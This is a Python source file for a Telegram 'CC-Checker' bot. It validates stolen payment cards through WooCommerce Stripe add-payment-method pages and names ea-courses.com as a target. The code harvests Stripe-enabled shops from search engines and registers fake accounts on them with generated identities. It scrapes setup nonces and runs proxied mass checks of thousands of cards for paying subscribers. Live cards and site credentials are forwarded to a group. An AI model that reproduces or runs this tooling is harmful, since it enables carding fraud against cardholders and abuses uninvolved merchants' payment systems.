"""
handlers/stripe_wc_handler.py — WooCommerce Stripe Gate commands (/st, /mst)
Confirmed target site: ea-courses.com
"""
import asyncio
import logging
import os
import time
import uuid
import io
import tempfile

from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

import config
import database.db as db
from core.parser import parse_cc, parse_mass
from core.bin_lookup import lookup_bin
from gateways.stripe_wc_gate import check_stripe_wc_gate, DEFAULT_SITE
from gateways.base import CCStatus
from utils.formatter import format_single_result
from utils.error_handler import notify_owner_on_error

logger = logging.getLogger("CC-Checker.StripeWCHandler")

SITE_URL = DEFAULT_SITE
SITE_LABEL = "Stripe-WC [SetupIntent]"

# Active mass check sessions
_mst_active: dict[int, bool] = {}
_mst_stop:   dict[tuple, asyncio.Event] = {}
_mst_tasks:  dict[tuple, list[asyncio.Task]] = {}



def register_stripe_wc_handler(app: Client):
    """Register Stripe WooCommerce commands (/st, /mst, /stadd, /stlist, /stremove)."""

    # ─────────────────────────────────────────────────────────────────────────
    # MANAGEMENT COMMANDS (Owner Only)
    # ─────────────────────────────────────────────────────────────────────────

    @app.on_message(filters.command("stadd"))
    @notify_owner_on_error
    async def cmd_st_add(client: Client, msg: Message):
        """Owner only: /stadd <website_url>"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            await msg.reply("⚠️ <b>Usage:</b> <code>/stadd https://example.com</code>", parse_mode=enums.ParseMode.HTML)
            return

        site_url = parts[1].strip().rstrip("/")
        if not site_url.startswith("http"):
            await msg.reply("❌ <b>Invalid URL format! Must start with http:// or https://</b>", parse_mode=enums.ParseMode.HTML)
            return

        wait = await msg.reply(f"🔄 <b>Adding WooCommerce Stripe site...</b> <code>{site_url}</code>", parse_mode=enums.ParseMode.HTML)
        
        # Test the site before adding
        try:
            from gateways.stripe_wc_gate import _check_stripe_wc_on_site
            from core.parser import CardData
            # Test with dummy card structure (will fail tokenize but returns 400 instead of site/network error if reached)
            dummy_card = CardData(number="4242424242424242", month="12", year="2028", cvv="123", bin="424242")
            res = await _check_stripe_wc_on_site(dummy_card, site_url)
            
            if res.status == CCStatus.ERROR and res.raw_code in ("site_unreachable", "pk_extraction_failed", "nonce_not_found"):
                await wait.edit_text(f"❌ <b>Site test failed!</b>\nReason: <code>{res.message}</code>", parse_mode=enums.ParseMode.HTML)
                return
                
            # Add to database
            ok = await db.add_stripe_wc_gate(site_url, msg.from_user.id)
            if ok:
                await wait.edit_text(
                    f"✅ <b>WooCommerce Stripe site added successfully!</b>\n"
                    f"🌐 <code>{site_url}</code>\n"
                    f"💳 SetupIntent Flow verified working.",
                    parse_mode=enums.ParseMode.HTML
                )
            else:
                await wait.edit_text("❌ <b>Failed to add site (already exists or database error).</b>", parse_mode=enums.ParseMode.HTML)
                
        except Exception as e:
            await wait.edit_text(f"❌ <b>Error validating site:</b> <code>{e}</code>", parse_mode=enums.ParseMode.HTML)

    @app.on_message(filters.command("stlist"))
    @notify_owner_on_error
    async def cmd_st_list(client: Client, msg: Message):
        """Owner only: /stlist"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        rows = await db._db.fetchall("SELECT id, base_url, is_active, success_count, fail_count FROM stripe_wc_gates ORDER BY id ASC")
        if not rows:
            await msg.reply("📭 <b>No WooCommerce Stripe sites configured.</b>", parse_mode=enums.ParseMode.HTML)
            return

        lines = ["<b>🏦 WooCommerce Stripe Sites Pool</b>\n"]
        for r in rows:
            status = "🟢" if r[2] == 1 else "🔴"
            lines.append(f"<b>#{r[0]}</b> {status} <code>{r[1]}</code> (S: {r[3]} | F: {r[4]})")
        
        await msg.reply("\n".join(lines), parse_mode=enums.ParseMode.HTML)

    @app.on_message(filters.command("stremove"))
    @notify_owner_on_error
    async def cmd_st_remove(client: Client, msg: Message):
        """Owner only: /stremove <id>"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            await msg.reply("⚠️ <b>Usage:</b> <code>/stremove <id></code>", parse_mode=enums.ParseMode.HTML)
            return

        target = parts[1].strip()
        try:
            if target.isdigit():
                await db._db.execute("DELETE FROM stripe_wc_gates WHERE id=?", (int(target),))
            else:
                await db._db.execute("DELETE FROM stripe_wc_gates WHERE base_url=?", (target,))
            await msg.reply("✅ <b>Site removed successfully!</b>", parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            await msg.reply(f"❌ <b>Error removing site:</b> <code>{e}</code>", parse_mode=enums.ParseMode.HTML)

    # ─────────────────────────────────────────────────────────────────────────
    # /stscan — Auto discover WooCommerce Stripe gates (Owner Only)
    # ─────────────────────────────────────────────────────────────────────────
    @app.on_message(filters.command("stscan"))
    @notify_owner_on_error
    async def cmd_st_scan(client: Client, msg: Message):
        """Owner only: /stscan [count]"""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 <b>Owner only.</b>", parse_mode=enums.ParseMode.HTML)
            return

        parts = msg.text.strip().split()
        count = 50
        if len(parts) > 1:
            try:
                count = min(int(parts[1]), 2000)  # Up to 2000 sites
            except ValueError:
                pass

        # Fetch a working proxy
        from core.proxy_manager import get_next_proxy
        proxy = get_next_proxy()
        if not proxy:
            await msg.reply(
                "❌ <b>No working proxy found in database!</b>\n"
                "Please add active proxies first before scanning.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        proxy_display = f"<code>{proxy['host']}:{proxy['port']}</code>"
        wait_msg = await msg.reply(
            f"🔭 <b>Stripe-WC Auto-Discovery Starting...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<blockquote>"
            f"🎯 <b>Target:</b> <code>{count} candidate sites</code>\n"
            f"🌐 <b>Search Proxy:</b> {proxy_display}\n"
            f"⚡ <b>Engines:</b> <code>Google + Bing + Yahoo + Yandex + DDG</code>"
            f"</blockquote>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ <i>Harvesting domains from search queries... (~1-2 min)</i>",
            parse_mode=enums.ParseMode.HTML
        )

        from core.auto_discover import discover_stripe_sites
        from core.proxy_manager import _build_proxy_url

        found_count = [0]

        async def progress_cb(n, total_target):
            found_count[0] = n
            try:
                pct = min(int(n / max(total_target, 1) * 100), 99)
                await wait_msg.edit_text(
                    f"🔭 <b>Stripe-WC Auto-Discovery...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<blockquote>"
                    f"🔍 <b>Harvested:</b> <code>{n} domains</code>\n"
                    f"🎯 <b>Target:</b> <code>{total_target}</code> | Progress: <code>{pct}%</code>"
                    f"</blockquote>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ <i>Mining search engines in parallel...</i>",
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception:
                pass

        p_dict = {
            "host": proxy["host"],
            "port": proxy["port"],
            "username": proxy.get("username", ""),
            "password": proxy.get("password", ""),
            "protocol": proxy.get("protocol", "http")
        }
        proxy_url = _build_proxy_url(proxy)

        try:
            domains = await discover_stripe_sites(count=count, proxy=p_dict, progress_cb=progress_cb)
        except Exception as e:
            await wait_msg.edit_text(f"❌ <b>Discovery failed:</b> <code>{e}</code>", parse_mode=enums.ParseMode.HTML)
            return

        if not domains:
            await wait_msg.edit_text("❌ <b>No domains found in search engine query!</b>", parse_mode=enums.ParseMode.HTML)
            return

        await wait_msg.edit_text(
            f"✅ <b>Harvested {len(domains)} candidate domains!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ <i>Probing WooCommerce Stripe endpoints... (~1 min)</i>",
            parse_mode=enums.ParseMode.HTML
        )

        # Candidate path sets for WooCommerce configurations (locale-aware/custom slugs)
        path_candidates = [
            "/my-account/add-payment-method/",
            "/en/moj-racun/add-payment-method/",
            "/moj-racun/add-payment-method/",
        ]
        
        from curl_cffi.requests import AsyncSession
        added_count = 0
        added_domains = []

        import aiohttp as _aiohttp
        from aiohttp import ClientTimeout as _CT, CookieJar as _CJ

        from faker import Faker as _Faker
        import random as _rand
        _faker_wc = _Faker()

        _PATH_CANDIDATES = [
            {"add": "/my-account/add-payment-method/", "post": "/my-account/"},
            {"add": "/en/moj-racun/add-payment-method/", "post": "/en/moj-racun/"},
            {"add": "/moj-racun/add-payment-method/", "post": "/moj-racun/"},
        ]
        _NONCE_PATTERNS = [
            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
            r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'",
            r'"setupIntentNonce"\s*:\s*"([^"]+)"',
            r'"stripe_setup_nonce"\s*:\s*"([^"]+)"',
            r'"wc_stripe_setup_nonce"\s*:\s*"([^"]+)"',
            r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
            r'"_ajax_nonce"\s*:\s*"([a-f0-9]{10,})"',
            r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
        ]
        _HDR = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
        }

        async def verify_and_add_site(site_url):
            nonlocal added_count
            if not site_url.startswith("http"):
                site_url = "https://" + site_url
            site_url = site_url.rstrip("/")

            jar = _CJ(unsafe=True)
            try:
                async with _aiohttp.ClientSession(
                    cookie_jar=jar,
                    connector=_aiohttp.TCPConnector(ssl=False, limit=3, force_close=True)
                ) as sess:
                    html_1 = ""
                    active_paths = None

                    # Step 1: Find add-payment-method page containing pk_live_
                    for paths in _PATH_CANDIDATES:
                        url_1 = f"{site_url}{paths['add']}"
                        try:
                            async with sess.get(
                                url_1, headers=_HDR, ssl=False,
                                timeout=_CT(total=10), allow_redirects=True
                            ) as r:
                                if r.status == 200:
                                    txt = await r.text(errors="ignore")
                                    if "pk_live_" in txt:
                                        html_1 = txt
                                        active_paths = paths
                                        break
                        except Exception:
                            pass

                    if not active_paths:
                        return False  # No Stripe WC endpoint / pk_live_ found

                    # Step 2: Account Registration check if registration form is present
                    reg_match = _re.search('name="woocommerce-register-nonce" value="(.*?)"', html_1)
                    if not reg_match:
                        reg_match = _re.search('name="woocommerce-login-nonce" value="(.*?)"', html_1)

                    if reg_match:
                        reg_nonce = reg_match.group(1)
                        fake_user = _faker_wc.user_name()[:10] + str(_rand.randint(100, 999))
                        data = {
                            'email': _faker_wc.email(),
                            'username': fake_user,
                            'woocommerce-register-nonce': reg_nonce,
                            'register': 'Register',
                        }
                        post_url = f"{site_url}{active_paths['post']}"
                        try:
                            async with sess.post(
                                post_url, headers=_HDR, data=data,
                                ssl=False, timeout=_CT(total=10)
                            ) as _r:
                                pass
                        except Exception:
                            pass

                        # Re-fetch add-payment-method page as logged-in user
                        try:
                            add_url = f"{site_url}{active_paths['add']}"
                            async with sess.get(
                                add_url, headers=_HDR, ssl=False, timeout=_CT(total=10)
                            ) as r_auth:
                                if r_auth.status == 200:
                                    html_1 = await r_auth.text(errors="ignore")
                        except Exception:
                            pass

                    # Step 3: Nonce extraction check
                    ajax_nonce = None
                    for pat in _NONCE_PATTERNS:
                        m = _re.search(pat, html_1)
                        if m:
                            ajax_nonce = m.group(1)
                            break

                    if not ajax_nonce:
                        return False  # Site non-functional or nonce missing

                    # Step 4: Verification successful! Add site to DB
                    ok = await db.add_stripe_wc_gate(site_url, msg.from_user.id)
                    if ok:
                        added_count += 1
                        added_domains.append(site_url)
                        return True

            except Exception:
                pass
            return False

        # Run verification — 20 workers parallel (4x faster)
        for i in range(0, len(domains), 20):
            batch = domains[i:i+20]
            batch_tasks = [verify_and_add_site(d) for d in batch]
            await asyncio.gather(*batch_tasks)
            # Update progress
            try:
                await wait_msg.edit_text(
                    f"📡 <b>Probing WooCommerce Domains...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<blockquote>"
                    f"📋 <b>Checked:</b> <code>{min(i+5, len(domains))}/{len(domains)}</code>\n"
                    f"✅ <b>Verified Gates:</b> <code>{added_count}</code>"
                    f"</blockquote>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ <i>Bypassing cloud security limits...</i>",
                    parse_mode=enums.ParseMode.HTML
                )
            except Exception:
                pass

        # Final Report
        preview_lines = []
        for d in added_domains[:10]:
            preview_lines.append(f"• <code>{d.replace('https://','').replace('http://','')}</code>")
        if len(added_domains) > 10:
            preview_lines.append(f"<i>...+{len(added_domains)-10} more</i>")
            
        preview_text = "\n".join(preview_lines) if preview_lines else "None"

        await wait_msg.edit_text(
            f"✅ <b>Stripe-WC Auto-Discovery Complete!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<blockquote>"
            f"📋 <b>Total Harvested:</b> <code>{len(domains)}</code>\n"
            f"⭐ <b>Verified Gates Added:</b> <code>{added_count}</code>"
            f"</blockquote>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>Active Gates Preview:</b>\n"
            f"{preview_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <i>These gates are now automatically available in /st and /mst rotation!</i>",
            parse_mode=enums.ParseMode.HTML
        )

    # ─────────────────────────────────────────────────────────────────────────
    # /st — Single check
    # ─────────────────────────────────────────────────────────────────────────
    @app.on_message(filters.command("st"))
    @notify_owner_on_error
    async def cmd_stripe_wc_single(client: Client, msg: Message):
        user_id = msg.from_user.id
        
        # Check permissions: owner only
        if user_id not in config.OWNER_IDS:
            await msg.reply(
                "❌ <b>Access Denied!</b>\n"
                "Only the bot owner is permitted to use the <code>/st</code> command.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # Parse card
        text = msg.text.strip()
        cc_text = text[len("/st"):].strip()
        if not cc_text:
            await msg.reply(
                "⚠️ <b>Usage:</b> <code>/st 4111111111111111|12|2027|123</code>\n\n"
                "🏦 <b>Stripe-WC Gate</b> (ea-courses.com)\n"
                "• ✅ SetupIntent Success → LIVE\n"
                "• 🔐 VBV/3DS Redirect → LIVE\n"
                "• ❌ Card Declined → DEAD",
                parse_mode=enums.ParseMode.HTML
            )
            return

        card = parse_cc(cc_text)
        if not card:
            await msg.reply(
                "❌ <b>Invalid card format!</b>\n"
                "Use: <code>4111111111111111|12|2027|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        wait_msg = await msg.reply(
            f"⚡ <b>𝐒𝐦𝐢𝐥𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 — Stripe-WC</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<blockquote>"
            f"🔍 <b>Card:</b> <code>{card.number}|{card.month}|{card.year}|{card.cvv}</code>\n"
            f"⛩️ <b>Gate:</b> <code>Stripe [SetupIntent]</code>\n"
            f"⚡ <b>Status:</b> <code>Processing...</code>"
            f"</blockquote>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ <i>Validating credentials on Stripe secure gateway...</i>",
            parse_mode=enums.ParseMode.HTML
        )

        t0 = time.monotonic()
        result = await check_stripe_wc_gate(card)
        elapsed = time.monotonic() - t0

        await db.increment_check_count(user_id)
        user_stats = await db.get_user_stats(user_id)
        quota = user_stats["total"]

        bin_info = await lookup_bin(card.bin)
        user_name = msg.from_user.username or msg.from_user.first_name or "user"
        text_out = format_single_result(card, result, bin_info, elapsed, username=user_name, quota=quota)

        await wait_msg.edit_text(text_out, parse_mode=enums.ParseMode.HTML)

        await db.log_check(
            user_id=user_id,
            card_number=card.number,
            card_bin=card.bin,
            status=result.status.value,
            gateway=result.gateway,
            is_vbv=result.status in (CCStatus.LIVE_VBV, CCStatus.LIVE_3DS),
            message=result.message,
        )

        # Forward hit to group/owner if live
        if result.is_live:
            try:
                from handlers.checker import _log_and_forward_hit
                await _log_and_forward_hit(
                    client=client,
                    user_id=user_id,
                    username=msg.from_user.username,
                    first_name=msg.from_user.first_name or "User",
                    card=card,
                    result=result,
                    elapsed=elapsed,
                )
            except Exception as e:
                logger.debug(f"st forward hit error: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # /mst — Mass check
    # ─────────────────────────────────────────────────────────────────────────
    @app.on_callback_query(filters.create(lambda _, __, cb: cb.data and cb.data.startswith("stop_mst_")))
    async def _stop_mst_cb(client: Client, cb):
        parts = cb.data.split("_")
        try:
            chat_id = int(parts[2])
            session_id = parts[3]
            sess_key = (chat_id, session_id)
            if sess_key in _mst_stop:
                _mst_stop[sess_key].set()
                # Cancel running tasks immediately
                if sess_key in _mst_tasks:
                    for t in _mst_tasks[sess_key]:
                        if not t.done():
                            t.cancel()
                    _mst_tasks.pop(sess_key, None)
                _mst_active.pop(cb.from_user.id, None)
                await cb.answer("🛑 Mass check stopped instantly!", show_alert=True)
            else:
                await cb.answer("⚠️ Check already completed or stopped.")
        except Exception as e:
            await cb.answer(f"Error: {e}")

    @app.on_message(filters.command("mst") & (filters.document | filters.text))
    @notify_owner_on_error
    async def cmd_stripe_wc_mass(client: Client, msg: Message):
        user_id = msg.from_user.id
        is_owner = user_id in config.OWNER_IDS

        if not is_owner:
            plan_info = await db.get_user_plan(user_id)
            if plan_info["plan"] in ("free", None, ""):
                await msg.reply(
                    "❌ <b>Access Denied!</b>\n"
                    "You need an active subscription for /mst.",
                    parse_mode=enums.ParseMode.HTML
                )
                return

        if _mst_active.get(user_id) and not is_owner:
            await msg.reply(
                "⚠️ <b>You already have a Stripe-WC check running!</b>\n"
                "Stop it first or wait for completion.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        # Find document
        doc_msg = None
        if msg.document:
            doc_msg = msg
        elif msg.reply_to_message and msg.reply_to_message.document:
            doc_msg = msg.reply_to_message

        if not doc_msg:
            await msg.reply(
                "❌ <b>How to use /mst:</b>\n\n"
                "<b>Method 1:</b> Send <code>.txt</code> file with caption <code>/mst</code>\n"
                "<b>Method 2:</b> Reply to a <code>.txt</code> file with <code>/mst</code>\n\n"
                "📄 Each line = one card: <code>4111111111111111|12|2026|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        doc = doc_msg.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            await msg.reply("❌ Only <code>.txt</code> files supported.", parse_mode=enums.ParseMode.HTML)
            return

        max_size = 10_000_000 if is_owner else 1_000_000
        if doc.file_size > max_size:
            await msg.reply(
                f"❌ File too large. Max <b>{'10MB' if is_owner else '1MB'}</b>.",
                parse_mode=enums.ParseMode.HTML
            )
            return

        wait_msg = await msg.reply("📥 <b>Downloading file...</b>", parse_mode=enums.ParseMode.HTML)

        # Download + parse
        tmp_path = None
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            await wait_msg.edit_text(f"❌ Failed to read file: <code>{e}</code>", parse_mode=enums.ParseMode.HTML)
            return
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

        cards = parse_mass(content)
        if not cards:
            await wait_msg.edit_text(
                "❌ No valid cards found in file.\n"
                "Format: <code>4111111111111111|12|2026|123</code>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        total = len(cards)
        max_cards = 5000 if is_owner else 500
        if total > max_cards:
            cards = cards[:max_cards]
            total = max_cards

        # Session
        session_id = uuid.uuid4().hex[:8]
        sess_key   = (msg.chat.id, session_id)
        stop_ev    = asyncio.Event()
        _mst_stop[sess_key]   = stop_ev
        _mst_active[user_id]  = True

        max_workers = config.OWNER_WORKERS if is_owner else 10
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mst_{msg.chat.id}_{session_id}")]
        ])

        # Animated start
        for frame in [
            "⚡ <b>Initializing Stripe-WC mass pipeline...</b>",
            "⚡ <b>Initializing</b> | 🔍 <i>Parsing card list...</i>",
            (
                f"<b>╔══════ 🏦 𝐒𝐭𝐫𝐢𝐩𝐞-𝐖𝐂 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊 ══════╗</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<blockquote>"
                f"📋 <b>Total Cards:</b> <code>{total}</code>\n"
                f"⛩️ <b>Gate:</b> <code>Stripe-WC [SetupIntent]</code>\n"
                f"⚡ <b>Parallelism:</b> <code>{max_workers} threads</code>\n"
                f"🎖 <b>Tier:</b> <code>{'Owner Mode 👑' if is_owner else 'Premium Mode ⭐'}</code>"
                f"</blockquote>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🚀 <i>Starting automated Stripe verification pipeline...</i>"
            ),
        ]:
            try:
                await wait_msg.edit_text(frame, parse_mode=enums.ParseMode.HTML, reply_markup=stop_markup)
            except Exception:
                pass
            await asyncio.sleep(0.5)

        # State tracking
        lock           = asyncio.Lock()
        done           = 0
        live_count     = 0
        dead_count     = 0
        error_count    = 0
        charged_list:  list[str] = []
        live_list:     list[str] = []
        dead_list:     list[str] = []
        start_ts       = time.monotonic()
        last_edit_ts   = 0.0
        sem            = asyncio.Semaphore(max_workers)

        # Clear proxy pool memory blocks so we have fresh rotation
        try:
            from core.proxy_manager import clear_dead_proxies_cache
            clear_dead_proxies_cache()
        except Exception:
            pass

        async def _worker(card):
            nonlocal done, live_count, dead_count, error_count, last_edit_ts

            async with sem:
                if stop_ev.is_set():
                    return

                t0 = time.monotonic()
                try:
                    result = await check_stripe_wc_gate(card)
                except Exception as e:
                    result = None
                    logger.debug(f"mst worker error: {e}")
                elapsed = time.monotonic() - t0
                card_str = f"{card.number}|{card.month}|{card.year}|{card.cvv}"

                async with lock:
                    done += 1
                    now = time.monotonic()

                    if result is None or result.status == CCStatus.ERROR:
                        error_count += 1
                    elif result.is_live:
                        live_count += 1
                        tag = "✅ APPROVED" if result.status == CCStatus.CHARGED else (
                              "🔐 VBV"     if result.status in (CCStatus.LIVE_VBV, CCStatus.LIVE_3DS) else
                              "🔥 LIVE")
                        
                        extra_data = result.extra or {}
                        site_url = extra_data.get("site", "")
                        email_val = extra_data.get("email", "")
                        pass_val = extra_data.get("password", "")
                        creds_part = f" | 🌐 {site_url} | 🔑 {email_val}:{pass_val}" if (site_url and email_val) else ""

                        entry = f"{tag} | {card_str} | {result.message[:50]}{creds_part} | {elapsed:.1f}s"
                        if result.status == CCStatus.CHARGED:
                            charged_list.append(entry)
                        else:
                            live_list.append(entry)
                    else:
                        dead_count += 1
                        dead_list.append(f"❌ DEAD | {card_str} | {(result.message or 'Declined')[:40]} | {elapsed:.1f}s")


                    # Progress update every 5 cards or 4 seconds
                    if done % 5 == 0 or (now - last_edit_ts) >= 4.0:
                        last_edit_ts = now
                        elapsed_total = int(now - start_ts)
                        pct  = int(done / total * 100)
                        bar  = "█" * (pct // 10) + "░" * (10 - pct // 10)
                        speed = done / max(elapsed_total, 1)
                        eta  = int((total - done) / max(speed, 0.01))
                        try:
                            await wait_msg.edit_text(
                                f"<b>🏦 𝐒𝐭𝐫𝐢𝐩𝐞-𝐖𝐂 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐑𝐮𝐧𝐧𝐢𝐧𝐠</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"<blockquote>"
                                f"📊 <b>Progress:</b> <code>[{bar}] {pct}%</code>\n"
                                f"📋 <b>Checked:</b> <code>{done}/{total}</code>\n"
                                f"✅ <b>Approved:</b> <code>{live_count}</code>\n"
                                f"❌ <b>Declined:</b> <code>{dead_count}</code>\n"
                                f"⚠️ <b>Errors:</b> <code>{error_count}</code>\n"
                                f"⚡ <b>Speed:</b> <code>{speed:.1f} cards/s</code>\n"
                                f"⏱ <b>ETA:</b> <code>{eta}s</code>"
                                f"</blockquote>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━",
                                parse_mode=enums.ParseMode.HTML,
                                reply_markup=stop_markup
                            )
                        except Exception:
                            pass

                    # Forward live hits to group
                    if result and result.is_live:
                        try:
                            from handlers.checker import _log_and_forward_hit
                            await _log_and_forward_hit(
                                client=client,
                                user_id=user_id,
                                username=msg.from_user.username,
                                first_name=msg.from_user.first_name or "User",
                                card=card,
                                result=result,
                                elapsed=elapsed,
                            )
                        except Exception as ex:
                            logger.debug(f"mst hit forward: {ex}")

        # Run all workers
        try:
            tasks = [asyncio.create_task(_worker(c)) for c in cards]
            _mst_tasks[sess_key] = tasks
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            pass
        finally:
            _mst_active.pop(user_id, None)
            _mst_stop.pop(sess_key, None)
            _mst_tasks.pop(sess_key, None)

        stopped = stop_ev.is_set()
        total_time = int(time.monotonic() - start_ts)
        speed = done / max(total_time, 1)

        # Final summary
        summary_lines = [
            f"<b>{'🛑 Stripe-WC Check Stopped!' if stopped else '✅ Stripe-WC Mass Check Done!'}</b>\n",
            f"<blockquote>",
            f"🌐 <b>Gate:</b> <code>{SITE_LABEL}</code>",
            f"📋 <b>Total:</b> <code>{done}/{total}</code>",
            f"✅ <b>Live:</b> <code>{live_count}</code>",
            f"❌ <b>Dead:</b> <code>{dead_count}</code>",
            f"⚠️ <b>Errors:</b> <code>{error_count}</code>",
            f"⏱ <b>Time:</b> <code>{total_time}s</code>",
            f"⚡ <b>Speed:</b> <code>{speed:.1f} cards/s</code>",
            f"</blockquote>",
        ]

        # Live hits inline (first 10)
        all_live = charged_list + live_list
        if all_live:
            summary_lines.append(f"\n<b>🔥 Live Hits ({len(all_live)}):</b>")
            for h in all_live[:10]:
                summary_lines.append(f"<code>{h}</code>")
            if len(all_live) > 10:
                summary_lines.append(f"<i>...+{len(all_live)-10} more in file below</i>")

        await wait_msg.edit_text(
            "\n".join(summary_lines),
            parse_mode=enums.ParseMode.HTML,
        )

        # Send results file
        if all_live or dead_list:
            file_lines = []
            if all_live:
                file_lines.append(f"=== LIVE ({len(all_live)}) ===")
                file_lines.extend(all_live)
                file_lines.append("")
            if dead_list:
                file_lines.append(f"=== DEAD ({len(dead_list)}) ===")
                file_lines.extend(dead_list)

            content_bytes = "\n".join(file_lines).encode("utf-8")
            buf = io.BytesIO(content_bytes)
            buf.name = f"mst_results_{session_id}.txt"
            buf.seek(0)

            caption = (
                f"📄 <b>Stripe-WC Results</b>\n"
                f"✅ Live: <code>{live_count}</code> | "
                f"❌ Dead: <code>{dead_count}</code> | "
                f"Total: <code>{done}</code>"
            )
            try:
                await msg.reply_document(
                    document=buf,
                    caption=caption,
                    parse_mode=enums.ParseMode.HTML,
                )
            except Exception as e:
                logger.debug(f"mst file send error: {e}")
